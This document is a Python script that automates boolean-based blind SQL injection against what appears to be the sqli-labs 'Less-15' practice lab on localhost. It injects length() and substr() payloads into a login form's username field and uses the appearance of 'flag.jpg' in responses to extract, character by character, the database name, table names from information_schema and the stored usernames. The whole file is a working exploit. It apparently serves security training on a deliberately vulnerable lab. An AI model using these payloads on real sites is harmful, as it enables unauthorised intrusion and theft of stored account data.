#!/usr/bin/python3

import requests
import string

req=requests.Session()

url="http://localhost/sqli-labs-php7/Less-15/"



def database_len(pld):
    payload="'or (length(({}))={})#"
    for i in range(200):
        b=payload.format(pld,i)
        data={'uname':b,'passwd':"","submit":"Submit"}
        r=req.post(url,data=data)
        #print(r.request.body)
        if 'flag.jpg' in r.text:
            return i
            break

def dump_db(len,pld):
    name=""
    payload="' or (substr(({}),{},1)='{}')#"
    a=string.printable
    for i in range(1,len+1):
        for j in a:
            b=payload.format(pld,i,j)
            data={'uname':b,'passwd':"","submit":"Submit"}
            r=req.post(url,data=data)
            #print(r.request.body)
            if 'flag.jpg' in r.text:
                name+=j
                #print(name)
                break
    return name



database=database_len("select database()")
#print(database)
db_name=dump_db(database,"select database()")
#print(db_name)

table = "select group_concat(table_name) from information_schema.tables where table_schema= database()"
tablen=database_len(table)
tables=dump_db(tablen,table)

print(tablen,tables)

usernames="select group_concat(username) from users"

user_len=database_len(usernames)
print(user_len)
usernamess=dump_db(user_len,usernames)
print(usernamess)
#uname=or+(substr((select+database()),8,)='%'#&passwd=&submit=Submit
